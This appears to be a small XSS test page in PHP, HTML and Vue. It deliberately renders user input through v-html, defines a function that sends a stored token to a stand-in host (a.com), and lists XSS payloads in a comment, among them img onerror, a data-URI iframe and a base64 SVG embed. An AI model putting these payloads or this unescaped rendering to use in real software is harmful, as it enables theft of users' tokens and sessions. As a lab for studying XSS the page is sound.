<?php 
   header("Set-Cookie: token=thisishttponlytoken; httpOnly");
?>

<!DOCTYPE html>
<html>
<head>
	<title>XSS test</title>
	<script src="https://cdn.jsdelivr.net/npm/vue/dist/vue.js"></script>
</head>
<body>

		this is a VUE app
		<div id="app">
		  <p v-html="message"></p>
		  <input v-model="message">
		</div>


	<script type="text/javascript">

		var app = new Vue({
		  el: '#app',
		  data: {
		    message: 'Hello Vue!'
		  }
		})

		localStorage.setItem("token","thisistoken");

		function sendToken(){
			console.log(document.cookie);
			var img=new Image();
			img.src='http://a.com?token='+ localStorage.getItem("token");

			// img.onerror=function(){
			//  alert('error');
			// }
			
			// img.onload=function(){
			//  alert('success');
			// }
			
		}
	</script>


<!-- 
		XSS payload for chrome:
		
		<img/src=x onerror=sendToken()>

		<iframe src="data:text/html,<script>alert(1)</script>"></iframe>

		<embed src="data:image/svg+xml;base64,PHN2ZyB4bWxuczpzdmc9Imh0dH A6Ly93d3cudzMub3JnLzIwMDAvc3ZnIiB4bWxucz0iaHR0cDovL3d3dy53My5vcmcv MjAwMC9zdmciIHhtbG5zOnhsaW5rPSJodHRwOi8vd3d3LnczLm9yZy8xOTk5L3hs aW5rIiB2ZXJzaW9uPSIxLjAiIHg9IjAiIHk9IjAiIHdpZHRoPSIxOTQiIGhlaWdodD0iMjAw IiBpZD0ieHNzIj48c2NyaXB0IHR5cGU9InRleHQvZWNtYXNjcmlwdCI+YWxlcnQoIlh TUyIpOzwvc2NyaXB0Pjwvc3ZnPg==" type="image/svg+xml" allowscriptaccess="always"></embed> 


 -->
</body>
</html>